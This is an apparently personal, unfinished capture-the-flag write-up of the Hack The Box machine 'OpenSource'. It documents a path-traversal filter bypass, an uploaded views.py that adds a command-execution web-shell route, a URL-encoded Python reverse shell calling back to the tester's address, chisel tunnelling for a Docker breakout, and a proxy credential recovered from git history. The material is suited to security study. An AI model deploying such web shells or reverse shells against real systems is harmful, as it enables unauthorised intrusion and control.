```
10.10.11.164
```
## Methods
### 1. Recon
Starting with [nmap](OpenSource.md#Nmap) I found two open ports and one interestingly filtered port. The website had two links which was `/download` and `/upcloud`. The former was the source code to the website and the second was a feature that let us upload a file to the website. 
 A couple of interesting things I found in the source code are listed below:
 1. `source/app/app/utils.py` -> tells us how the website prevent path traversal. 
	```python
	return recursive_replace(file_name, "../", "") + "_" + str(current_milli_time()) + "." + file_extension
	```
 The above piece of code on line 26 recursively called a function which removed the traversal sequence `../` but unfortunately not `..//`. I used the latter to get [Path Traversal](../Guide/Web/Path%20Traversal%20&%20LFI.md). It wasn't LFI since we could only read file not execute them.
	 ```
	 /uploads/..//etc/passwd 
	```
1. `source/app/app/views.py` -> includes functions that describe the behaviour of each route.
2. `.git` -> this is why you should list all file. There was a dev branch in this repo and it had 4 commit. The second commit called update had a file called `app/.vscode/settings.json`  which included a credential.
	```bash
	git branch
	git checkout dev
	git log --oneline --raw
	git checkout 
	git checkout a76f8f7
	cat app/.vscode/settings.json
	```
	```json
	{
	  "python.pythonPath": "/home/dev01/.virtualenvs/flask-app-b5GscEs_/bin/python",
	  "http.proxy": "http://dev01:Soulless_Developer#2022@10.10.10.128:5187/",
	  "http.proxyStrictSSL": false
	}
	```
### 2. Web Exploitation
Now that we knew the website was vulnerable to path traversal, we could potentially upload any file, any where in the system ([check here](../Guide/Web/File%20Upload%20Vulnerability.md#Control%20file%20locationl)). I modified `views.py` file to add an RCE route by adding the function below.
```python
@app.route('/not-rce')
def totally_harmless():
    import subprocess
    command = request.args.get('cmd')
    return subprocess.Popen(command, shell=True, stdout=subprocess.PIPE).stdout.read()
```
```
Content-Disposition: form-data; name="file"; filename="..//app/app/views.py"
```
![](../Assets/images/Pasted%20image%2020220821212436.png)
```
http://10.10.11.164/not-rce?cmd=python3%20-c%20%27import%20socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%2210.10.14.48%22,443));os.dup2(s.fileno(),0);%20os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import%20pty;%20pty.spawn(%22sh%22)%27
```
Note: Other method to get RCE is to crack `Werkzeug` pin. This method IS possible since we can read system's file. I only managed to get the correct pin once. After that, the pin generation didn't seem to work so I thought this method was a rabbit hole, if not inconsistent.  
### 3. Docker Breakout
```
./nmap -n -sS -T4 172.17.0.1 -v
```
### 4. Privilege Escalation


## Nmap
<pre style="font-size: 12px";>
# nmap -sC -sV -oN nmap/opensource $IP
Not shown: 997 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
<font color=red>22/tcp</font> open  ssh    <font color=red> OpenSSH 7.6p1</font> Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)
<font color=red>80/tcp </font>open  http    <font color=red>Werkzeug/2.1.2</font> Python/3.10.3
<font color=red>3000/tcp</font> filtered ppp
</pre>

## 
## File and Directory Scanning
<pre style="font-size: 12px";>
$ dirb http://10.10.11.164/
+ http://10.10.11.164/<font color=red>console</font> (CODE:200|SIZE:1563)
+ http://10.10.11.164/<font color=red>download</font> (CODE:200|SIZE:2489147)
</pre>

Code that strips `../`:
```python
"""
Pass filename and return a secure version, which can then safely be stored on a regular file system.
"""
def get_file_name(unsafe_filename):
    return recursive_replace(unsafe_filename, "../", "")

(omitted)

"""
Recursively replace a pattern in a string
"""
def recursive_replace(search, replace_me, with_me):
    if replace_me not in search:
        return search
    return recursive_replace(search.replace(replace_me, with_me), replace_me, with_me)
```

`/etc/passwd` respond:
<pre style="font-size: 12px";>
HTTP/1.1 304 NOT MODIFIED
Server: Werkzeug/2.1.2 Python/3.10.3
Date: Sun, 24 Jul 2022 08:13:04 GMT
Content-Disposition: inline; filename=passwd
Cache-Control: no-cache
ETag: "1631819611.0-1172-430441564"
Date: Sun, 24 Jul 2022 08:13:04 GMT
Connection: close
</pre>

`/proc/self/environ` respond:
<pre style="font-size: 12px";>
HTTP/1.1 200 OK
Server: Werkzeug/2.1.2 Python/3.10.3
Date: Sun, 24 Jul 2022 08:14:28 GMT
Content-Disposition: inline; filename=environ
Content-Type: application/octet-stream
Content-Length: 0
Last-Modified: Sun, 24 Jul 2022 08:07:44 GMT
Cache-Control: no-cache
ETag: "1658650064.906572-0-1118308124"
Date: Sun, 24 Jul 2022 08:14:28 GMT
Connection: close
</pre>

/home/43ccb766088e/.ssh/id_rsa

Uploaded file is located at `/app/public/uploads/[file]` on the system.

## Attack Vector
> retired box Backend & BackendTwo (public WP available) helps in final foothold.

1. 80 HTTP. We can do LFI, ex: `uploads/%2E%2E%2F/etc/passwd` 
	1. **RE the pin?** possible if you can read arbitrary files in the system. (https://ctftime.org/writeup/17955).  Note: Very close, we just need to find the machine-id. PIN: 691-398-360
	2. **Reverse shell**? upload a code in the system and run it with LFI?
2. 22 SSH → nothing's interesting. 
3. 3000 ppp → ???


Questions:
1. how does `..//` give us LFI?


## Docker Breakout
```
./chisel server -p 8000 --reverse
```
```
./chisel client 10.10.14.48:8000 R:8001:172.17.0.1:3000
```

<pre style="font-size: 12px";>
┌──(kali㉿kali)-[~/pentesting/htb_machines/opensource/sourcev2]
└─$ git log --raw
commit c41fedef2ec6df98735c11b2faf1e79ef492a0f3 (HEAD -> dev)
Author: gituser <gituser@local>
Date:   Thu Apr 28 13:47:24 2022 +0200

    ease testing

:100644 100644 76c7768 0875eda M        Dockerfile

commit be4da71987bbbc8fae7c961fb2de01ebd0be1997
Author: gituser <gituser@local>
Date:   Thu Apr 28 13:46:54 2022 +0200

    added gitignore

:000000 100644 0000000 e50a290 A        .gitignore
:100644 000000 5975e3f 0000000 D        app/.vscode/settings.json

commit a76f8f75f7a4a12b706b0cf9c983796fa1985820
Author: gituser <gituser@local>
Date:   Thu Apr 28 13:46:16 2022 +0200

    updated

:000000 100644 0000000 5975e3f A        app/.vscode/settings.json
:100644 100644 f2744c6 0f3cc37 M        app/app/views.py

commit ee9d9f1ef9156c787d53074493e39ae364cd1e05
Author: gituser <gituser@local>
Date:   Thu Apr 28 13:45:17 2022 +0200

    initial
</pre>

```
dev01:Soulless_Developer#2022
```